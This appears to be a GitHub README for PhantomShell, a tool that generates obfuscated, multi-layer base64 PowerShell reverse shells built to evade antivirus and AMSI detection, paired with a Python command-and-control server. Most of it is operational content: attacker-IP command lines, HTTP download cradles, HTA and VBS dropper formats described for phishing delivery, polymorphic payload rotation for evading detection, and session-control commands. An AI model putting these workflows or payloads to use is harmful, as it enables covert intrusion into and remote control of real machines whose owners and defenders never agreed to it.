<div align="center">

```
  ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
  ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
  ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
  ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
  ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
       ███████╗██╗  ██╗███████╗██╗     ██╗
       ██╔════╝██║  ██║██╔════╝██║     ██║
       ███████╗███████║█████╗  ██║     ██║
       ╚════██║██╔══██║██╔══╝  ██║     ██║
       ███████║██║  ██║███████╗███████╗███████╗
       ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
```

## 👻 What is PhantomShell?

PhantomShell generates obfuscated, base64-encoded PowerShell reverse shells designed to evade **signature-based** AV and AMSI detection. It automates the tedious process of renaming variables, encoding payloads across multiple layers, hiding connection details, and serving payloads over HTTP — all from a single command.

**v2.0 is a hardened rewrite.** Earlier versions had three bugs that caused shells to not work at all: illegal backticks on .NET methods, random case mutation breaking `Out-String`, and junk comment injection corrupting base64 strings. All three are gone. The tool now includes a built-in integrity verifier and round-trip decoder that confirms every payload is valid before printing it.

---

## 🔍 Is it "Fully Undetectable"?

**Honest answer: no tool can guarantee that — and any tool claiming otherwise is lying to you.**

Here is what PhantomShell actually does and what it doesn't:

| Layer | What it defeats | What it doesn't defeat |
|---|---|---|
| Variable renaming | Signature matching on known variable names | Behavioral/heuristic analysis |
| utf-16le base64 encoding | Plain-text pattern matching | Runtime AMSI scanning when the payload executes |
| Multi-layer IEX wrapping | Static analysis that only unpacks one layer | Deep sandboxing, EDR with full deobfuscation |
| IP/port b64 hiding | Simple string search for IPs | Network-level detection, DNS monitoring |
| Random variable names | Hash-based payload signatures | AI/ML-based behavioral detection |

**Against modern Windows Defender (real-time + cloud + AMSI):** the `random` profile with `--layers 3` and `--enc-b64` provides the best chance of bypassing signature-based detection. However, once the payload executes and opens a TCP socket, behavioral detection can still flag it. PhantomShell buys you an entry point — operational security beyond that is your responsibility.

**Best results in practice:**
- Use `--layers 3` on hardened targets
- Use `--enc-b64` to hide the IP/port
- Use `polymorph` to rotate payloads if one gets caught
- Pair with `server` so the payload is pulled over HTTP (reduces disk exposure)

---

# 🚀 Features

## ⚡ Payload Generation

- Multi-layer PowerShell encoding
- AMSI-aware payload structures
- Polymorphic payload generation
- Randomized variable obfuscation
- Multiple delivery formats

## 🎮 Command & Control

- Lightweight Python C2 server
- Web interface for session management
- Interactive operator CLI
- Multiple concurrent session support
- Real-time command execution

## 🎯 Red Team Operations

- Reverse shell payload generation
- HTTP payload hosting
- Remote command execution
- Session monitoring

---

# 🏗 Architecture

```
Target Machine
      │
      │ Reverse Shell
      ▼
PhantomShell C2 Server
      │
      ├── CLI Interface
      │
      └── Web Management Dashboard
```

The payload executed on a target system connects back to the **PhantomShell listener**, allowing operators to control sessions through the CLI or web interface.

---

## ⚙️ Installation

No dependencies. Pure Python stdlib.

```bash
git clone https://github.com/adrilaw/PhantomShell.git
cd PhantomShell
chmod +x phantomshell.py
python3 phantomshell.py --help
```

---

## 🚀 Quick Start

**Terminal 1 — start your c2 server to send commands to the trarget:**

# 🧰 C2 server Command Reference

## Start C2 Server

### Options

| Option | Description |
|------|-------------|
| `--host` | Bind address |
| `--port` | Reverse shell listener port |
| `--web-port` | Web UI port |
| `--password` | Web interface password |
| `--no-cli` | Disable CLI |

Example:

```bash
python3 phantomc2.py --port 4444 --web-port 8080 --password RedTeam2026
```
This launches:

- Reverse shell listener on **4444**
- Web dashboard on **8080**

---

# 💾 Payload generating command Reference

**Terminal 2 — generate payload:**
```bash
python3 phantomshell.py revshell -i 10.10.10.5 -p 4444
```

Copy the red output and run it on the target Windows machine. Shell arrives in Terminal 1.

---

## 📖 Command Reference

### `revshell` — Standalone Payload

Generates a single encoded command ready to paste and execute.

```bash
python3 phantomshell.py revshell -i <IP> -p <PORT> [OPTIONS]
```

| Flag | Short | Description | Default |
|---|---|---|---|
| `--attacker-ip` | `-i` | Your IP address | required |
| `--port` | `-p` | Listening port | required |
| `--obf-profile` | `-o` | `minimal` / `aggressive` / `random` | `aggressive` |
| `--layers` | `-l` | Encoding layers: `1` `2` `3` | `1` |
| `--format` | `-f` | `powershell` `cmd` `hta` `vbs` `mshta` | `powershell` |
| `--enc-b64` | | Hide IP and port in base64 | off |
| `--keep-pwd` | | Show CWD in prompt (may trigger AMSI) | off |
| `--do-not-hide` | | Omit `-NoP -sta -NonI -W Hidden` | off |
| `--verbose` | `-v` | Show decoded payload before encoding | off |
| `--no-banner` | | Suppress ASCII banner | off |

**Examples:**

```bash
# Basic — aggressive profile, layer 1
python3 phantomshell.py revshell -i 10.10.10.5 -p 4444

# Maximum evasion — random vars, 3 layers, hidden IP/port
python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 -o random -l 3 --enc-b64

# HTA dropper with 2 layers
python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 -f hta -l 2

# cmd.exe wrapper
python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 -f cmd

# See exactly what gets encoded (verbose)
python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 -v

# No PS hidden-window flags (for testing)
python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 --do-not-hide
```

---

### `server` — HTTP Payload Hosting

Writes the obfuscated `.ps1` to disk, starts a Python HTTP server, and prints a download cradle for the target to execute. The target pulls the script over HTTP and executes it — nothing touches disk on the target machine.

```bash
python3 phantomshell.py server -i <IP> -p <PORT> [OPTIONS]
```

| Flag | Description | Default |
|---|---|---|
| `-i` | Your IP (also used as HTTP server address) | required |
| `-p` | Reverse shell listening port | required |
| `--server-port` | HTTP server port | `8000` |
| `-o, --outfile` | Payload filename on disk | random e.g. `svc_abcxyz.ps1` |
| `--obf-profile` | `minimal` / `aggressive` / `random` | `aggressive` |
| `-l, --layers` | Encoding layers for the cradle | `1` |
| `-f, --format` | Output format | `powershell` |
| `--enc-b64` | Hide IP/port in base64 | off |
| `--keep-file` | Do not delete payload file after serving | off |
| `--keep-pwd` | Show CWD in prompt | off |
| `--do-not-hide` | Omit hidden-window flags | off |
| `-v` | Verbose output | off |

**Examples:**

```bash
# Default — serves on port 8000, random filename
python3 phantomshell.py server -i 10.10.10.5 -p 4444

# Custom HTTP port + named file
python3 phantomshell.py server -i 10.10.10.5 -p 4444 --server-port 9090 -o update.ps1

# 3 layers on the cradle + b64 IP hiding
python3 phantomshell.py server -i 10.10.10.5 -p 4444 -l 3 --enc-b64

# Keep the file after serving (for inspection)
python3 phantomshell.py server -i 10.10.10.5 -p 4444 --keep-file
```

**On the target — run the cradle printed by PhantomShell:**
```powershell
powershell -NoP -sta -NonI -W Hidden -enc <CRADLE_FROM_OUTPUT>
```

---

### `polymorph` — Polymorphic Variant Generator

Generates N unique payloads in one shot. Each variant rotates through profiles and uses fresh random variable names. Every variant has a different MD5 fingerprint — useful when one payload gets caught and you need to rotate quickly.

```bash
python3 phantomshell.py polymorph -i <IP> -p <PORT> [OPTIONS]
```

| Flag | Description | Default |
|---|---|---|
| `-i` | Your IP | required |
| `-p` | Listening port | required |
| `-n, --count` | Number of variants | `3` |
| `-l, --layers` | Encoding layers per variant | `1` |
| `--enc-b64` | Hide IP/port in base64 | off |
| `--keep-pwd` | Show CWD in prompt | off |
| `-v` | Verbose | off |

**Examples:**

```bash
# 5 variants, default settings
python3 phantomshell.py polymorph -i 10.10.10.5 -p 4444 -n 5

# 10 variants, 2 layers each, hidden IP
python3 phantomshell.py polymorph -i 10.10.10.5 -p 4444 -n 10 -l 2 --enc-b64

# 3 variants with 3 layers (maximum evasion)
python3 phantomshell.py polymorph -i 10.10.10.5 -p 4444 -n 3 -l 3
```

Output example:
```
── Variant 1  profile=minimal     layers=1  FP:B0CCA4CD  ──────────
── Variant 2  profile=aggressive  layers=1  FP:06F530B1  ──────────
── Variant 3  profile=random      layers=1  FP:A273D56F  ──────────
```

---

## 🎯 Obfuscation Profiles

### `minimal`
Simple short variable renames. Fast, readable, low footprint.
```
$client → $c    $stream → $st    $bytes → $b
$data → $d      $sendback → $sb  $sendback2 → $sb2  $sendbyte → $sy
```

### `aggressive` *(default)*
Medium-length obfuscated names with hex-style identifiers.
```
$client → $xA1   $stream → $xB2   $bytes → $xC3
$data → $xD4     $sendback → $xE5  $sendback2 → $xE52  $sendbyte → $xF6
```

### `random`
Fully random variable names on every execution. No two runs produce the same payload. Best against hash/signature-based detection.
```
$client → $mKpRx    $stream → $zQ6v8A6    $bytes → $hySOJ  (example)
```

---

## 🧅 Encoding Layers

| Layer | What it does |
|---|---|
| `1` | `utf-16le → base64` → standard PS `-enc` flag |
| `2` | Layer 1 blob wrapped in `IEX(FromBase64String(...))`, then encoded again |
| `3` | Layer 2 blob wrapped in `$_b=...; $_s=...; IEX($_s)`, then encoded again |

Each layer is a complete re-encoding of the previous stage. The payload is verified by decoding every layer before output — if any layer is corrupt, the tool refuses to print it.

---

## 📦 Output Formats

| Format | How to use it |
|---|---|
| `powershell` | Paste directly into PowerShell or a run dialog |
| `cmd` | Use when you have cmd.exe RCE (via `cmd /c`) |
| `hta` | Save as `.hta`, open with mshta.exe — phishing/click delivery |
| `vbs` | Save as `.vbs`, run with wscript/cscript — macro delivery |
| `mshta` | One-liner for `mshta vbscript:` execution |

---

## 🧪 Full Attack Workflow

```bash
# Terminal 1 — listener
nc -lvnp 4444

# Terminal 2 — host payload + print cradle
python3 phantomshell.py server -i 10.10.10.5 -p 4444 -o svc_update.ps1 -l 2 -o random

# [On target Windows machine — paste the red output from PhantomShell]
powershell -NoP -sta -NonI -W Hidden -enc <OUTPUT>

# Shell lands in Terminal 1
```

---

## Generate Reverse Shell Payload

```bash
python3 phantomshell.py revshell -i YOUR_IP -p 4444
```

Copy the generated command and execute it on the **target Windows system**.

---

## Access Web Dashboard

```
http://YOUR_SERVER_IP:8080
```

Login using the password specified when starting the C2 server.

---


## Generate Payload

```bash
python3 phantomc2.py revshell -i <IP> -p <PORT>
```

### Optional Parameters

| Option | Description |
|------|-------------|
| `--obf-profile` | Obfuscation profile |
| `--layers` | Encoding layers |
| `--format` | Payload format |
| `--enc-b64` | Encode IP and port |

Example:

```bash
python3 phantomc2.py revshell -i 10.10.10.5 -p 4444 -o random -l 3
```

---

## HTTP Payload Hosting

```bash
python3 phantomc2.py server -i <IP> -p <PORT>
```

Example:

```bash
python3 phantomc2.py server -i 10.10.10.5 -p 4444 --server-port 8000
```

---

# 🖥 C2 Operations

Once a target connects, operators can manage sessions.

### List Sessions

```
sessions
```

### Interact With Session

```
interact <session_id>
```

### Execute Command

```
exec <session_id> <command>
```

Example

```
exec 1 whoami
```

### Kill Session

```
kill <session_id>
```

---

# 🔐 Payload Techniques

PhantomShell implements several techniques to reduce detection.

### Obfuscation

- Variable randomization
- Payload polymorphism
- Encoded execution layers

### Encoding Workflow

```
PowerShell Payload
      ↓
Unicode Encoding
      ↓
Base64 Encoding
      ↓
Execution Wrapper
```

---

# 🎯 Example Red Team Workflow

### 1. Start Infrastructure

```bash
python3 phantomc2.py c2 --port 4444 --web-port 8080
```

### 2. Generate Payload

```bash
python3 phantomc2.py revshell -i 192.168.1.100 -p 4444
```

### 3. Execute on Target

Run the generated command on the Windows system.

### 4. Manage Session

```
sessions
interact 1
whoami
hostname
```

---

# 🛡 Security Considerations

PhantomShell should only be used in **controlled and authorized environments**.

Recommended operational security practices:

- Use strong authentication passwords
- Restrict access with firewall rules
- Deploy behind reverse proxy with HTTPS
- Monitor infrastructure logs
- Rotate infrastructure after engagements

---

# 🐛 Troubleshooting

## Port Already In Use

Check which process is using the port:

```bash
netstat -tulpn | grep 4444
```

---

## Web Dashboard Not Accessible

Check if the service is listening:

```bash
netstat -tulpn | grep 8080
```

Verify firewall rules if necessary.

---

# 🛣 Roadmap

Future development plans include:

- Encrypted C2 communications
- Database-backed session persistence
- Multi-user role-based access control
- File upload and download capabilities
- SOCKS proxy pivoting
- Plugin architecture

---

# 🤝 Contributing

Contributions are welcome.

Possible contribution areas:

- Additional obfuscation techniques
- New payload delivery formats
- C2 server improvements
- Documentation
- Cross-platform testing

Workflow:

```
Fork repository
Create feature branch
Commit improvements
Submit pull request
```

---

# ⚠ Legal Disclaimer

This software is intended **exclusively for authorised cybersecurity testing**.

Allowed uses include:

- Authorized penetration testing
- Red team engagements
- Security research
- Capture-the-Flag environments

Unauthorized use against systems without explicit permission may violate computer crime laws.

The author assumes **no responsibility for misuse**.

---

# 📜 License

This project is licensed under:

**GNU General Public License**

See `LICENSE` for details.

---

# 🙏 Credits

PhantomShell builds on concepts from the offensive security community.

Inspirations include:

- Nishang PowerShell framework
- AMSI bypass research
- Red team tools such as Cobalt Strike and Metasploit

---

# 👨‍💻 Author

**Dodin Mel Adrien Lawrence Enzo**

Offensive Security | Red Teaming

🔗 LinkedIn  
https://www.linkedin.com/in/dodin-mel-adrien-lawrence-enzo-5568b91b5/

🐦 Twitter  
https://twitter.com/AdrienDodin

---

<div align="center">

⭐ If this project helped you during research or a security engagement, consider starring the repository.

</div>

<div align="center">



